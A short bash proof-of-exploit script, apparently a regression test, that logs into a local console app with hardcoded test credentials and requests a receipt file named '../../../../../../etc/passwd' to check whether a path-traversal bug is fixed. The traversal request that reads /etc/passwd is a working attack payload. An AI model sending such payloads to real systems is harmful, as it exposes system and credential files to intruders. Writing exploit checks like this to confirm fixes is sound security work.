#!/usr/bin/env bash
set -euo pipefail
# LG-PATH-001 proof-of-exploit: path traversal in the console posting-receipt download. Signs on for
# a real staff session, then requests /receipt with a name that walks out of the receipt directory.
# Fires (exit 0) when the response leaks a file outside the dir (/etc/passwd, detected by a 'root:'
# line) -- only possible with receipt_subfolders=on. With the fix the name is reduced to a basename, so
# the read stays in the receipt dir and returns 404. Hits the console directly on its published port.
# Env: PASCAL_URL (default http://localhost:8085).

PASCAL_URL="${PASCAL_URL:-http://localhost:8085}"
JAR="$(mktemp)"
trap 'rm -f "$JAR"' EXIT

# Real sign-on (orthogonal to the traversal bug) to obtain a valid session cookie.
curl -sS -c "$JAR" -X POST "$PASCAL_URL/login" \
  --data-urlencode 'staff_id=TLR001' --data-urlencode 'password=teller-pw' >/dev/null

resp="$(curl -sS -b "$JAR" "$PASCAL_URL/receipt?name=../../../../../../etc/passwd")"

if printf '%s' "$resp" | grep -q '^root:'; then
  echo "LG-PATH-001 FIRED: receipt endpoint leaked /etc/passwd -> $(printf '%s' "$resp" | head -1)"
  exit 0
fi
echo "LG-PATH-001 not fired: $(printf '%s' "$resp" | head -c 200)" >&2
exit 1
